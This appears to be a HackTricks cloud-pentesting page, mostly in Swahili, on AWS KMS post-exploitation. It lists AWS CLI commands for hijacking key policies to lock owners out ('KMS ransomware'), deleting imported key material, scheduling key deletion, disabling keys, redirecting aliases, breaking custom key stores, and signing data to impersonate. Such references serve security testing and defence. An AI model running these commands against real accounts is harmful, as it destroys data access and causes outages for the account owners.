# AWS - KMS Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## KMS

Kwa maelezo zaidi angalia:

{{#ref}}
../aws-services/aws-kms-enum.md
{{#endref}}

### Encrypt/Decrypt taarifa

`fileb://` and `file://` are URI schemes used in AWS CLI commands to specify the path to local files:

- `fileb://:` Inasoma faili kwa mode ya binary, kawaida inatumiwa kwa faili zisizo za maandishi.
- `file://:` Inasoma faili kwa mode ya maandishi, kwa kawaida inatumiwa kwa faili za maandishi za kawaida, scripts, au JSON ambazo hazina mahitaji maalum ya encoding.

> [!TIP]
> Kumbuka kwamba ikiwa unataka decrypt data ndani ya faili, faili lazima iwe na data ya binary, sio data iliyokuwa base64 encoded. (fileb://)

- Kutumia a **symmetric** key
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- Kutumia funguo **asimetriki**:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

Mshambuliaji akiwa na ufikiaji wa hadhi ya juu kwa KMS anaweza kubadilisha sera za KMS za keys na **kumpa akaunti yake ufikiaji kwa keys hizo**, na kuondoa ufikiaji uliotolewa kwa akaunti halali.

Baada yake, watumiaji wa akaunti halali hawataweza kufikia taarifa yoyote ya huduma yoyote iliyosimbwa kwa keys hizo, kuunda ransomware rahisi lakini yenye ufanisi dhidi ya akaunti hiyo.

> [!WARNING]
> Kumbuka kwamba **AWS managed keys hazinaathiriwa** na shambulio hili; ni **Customer managed keys** tu.

> Pia kumbuka hitaji la kutumia param **`--bypass-policy-lockout-safety-check`** (ukosefu wa chaguo hili kwenye web console unafanya shambulio hili liwe linawezekana tu kupitia CLI).
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> Tambua kwamba ikiwa utabadilisha policy hiyo na kutoa ufikiaji kwa external account tu, na kisha kutoka external account hii ukajaribu kuweka policy mpya ili **give the access back to original account, you won't be able cause the Put Polocy action cannot be performed from a cross account**.

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Jeneriki KMS Ransomware

Kuna njia nyingine ya kutekeleza KMS Ransomware ya kimataifa, ambayo itajumuisha hatua zifuatazo:

- Tengeneza key mpya na **key material** iliyopingwa/imeingizwa na attacker
- **Re-encrypt older data** ya victim iliyofichwa na version ya awali kwa kutumia ile mpya
- **Futa KMS key**
- Sasa ni attacker pekee, ambaye ana original key material, atakayekuwa na uwezo wa decrypt data iliyofichwa

### Futa Vifunguo kupitia `kms:DeleteImportedKeyMaterial`

Kwa ruhusa ya `kms:DeleteImportedKeyMaterial`, mshiriki anaweza kufuta imported key material kutoka CMKs zenye `Origin=EXTERNAL` (CMKs ambazo zimeingiza key material zao), na kuzifanya zisizoweza ku-decrypt data. Kitendo hiki ni cha uharibifu na hakirejeshiki isipokuwa material inayofaa iingizwe tena, na hivyo kumruhusu attacker kusababisha kwa ufanisi kupoteza data kama ransomware kwa kufanya taarifa zilizofichwa zisipatikane milele.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### Haribu funguo

Kuangamiza funguo kunaweza kusababisha DoS.
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> Kumbuka kwamba AWS sasa **inazuia vitendo vilivyotangulia kutekelezwa kutoka cross-account:**

### Badilisha au futa Alias
Shambulio hili linafuta au kuielekeza upya AWS KMS aliases, kuharibu utambuzi wa ufunguo na kusababisha kushindwa mara moja kwa huduma yoyote inayotegemea alias hizo, ikisababisha denial-of-service. Kwa ruhusa kama `kms:DeleteAlias` au `kms:UpdateAlias` mshambuliaji anaweza kuondoa au kurekebisha mwelekeo wa alias na kuingilia kati operesheni za kriptografia (mf., encrypt, describe). Huduma yoyote inayorejelea alias badala ya key ID inaweza kushindwa hadi alias irekebishwe au irejeshwe kwa usahihi.
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Kukatisha Ufutaji wa Ufunguo
Kwa ruhusa kama `kms:CancelKeyDeletion` na `kms:EnableKey`, mhusika anaweza kukatisha ufutaji uliopangwa wa AWS KMS customer master key na baadaye kuiwezesha tena. Hii hurudisha ufunguo (mwanzoni katika Disabled state) na kurejesha uwezo wake wa decrypt data iliyolindwa hapo awali, ikiruhusu exfiltration.
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Kuzima Funguo
Kwa ruhusa ya `kms:DisableKey`, muingiliaji anaweza kuzima AWS KMS customer master key, akizuia itumike kwa encryption au decryption. Hii inavunja ufikiaji kwa huduma yoyote inayotegemea CMK hiyo na inaweza kusababisha usumbufu wa papo hapo au denial-of-service hadi funguo itakapowezeshwa tena.
```bash
aws kms disable-key \
--key-id <key_id>
```
### Derive Shared Secret
Kwa ruhusa ya `kms:DeriveSharedSecret`, mhusika anaweza kutumia private key iliyoshikiliwa na KMS pamoja na public key iliyotolewa na mtumiaji ili kuhesabu ECDH shared secret.
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
Kwa ruhusa ya `kms:Sign`, mhusika anaweza kutumia KMS-stored CMK kusaini data kwa njia ya cryptographic bila kufichua private key, na kuzalisha signatures halali ambazo zinaweza kuwezesha impersonation au kuidhinisha vitendo hatarishi.
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS with Custom Key Stores
Kwa ruhusa kama `kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore`, au `kms:UpdateCustomKeyStore`, muigizaji anaweza kubadilisha, kutenganisha, au kufuta AWS KMS Custom Key Store (CKS), na kufanya vifunguo vyake vya msingi visifanye kazi. Hii inavunja operesheni za usimbaji, ufumbuzi (decryption), na kuweka saini kwa huduma yoyote inayotegemea vifunguo hivyo na inaweza kusababisha immediate denial-of-service. Kudhibiti na kufuatilia ruhusa hizo ni muhimu.
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../banners/hacktricks-training.md}}
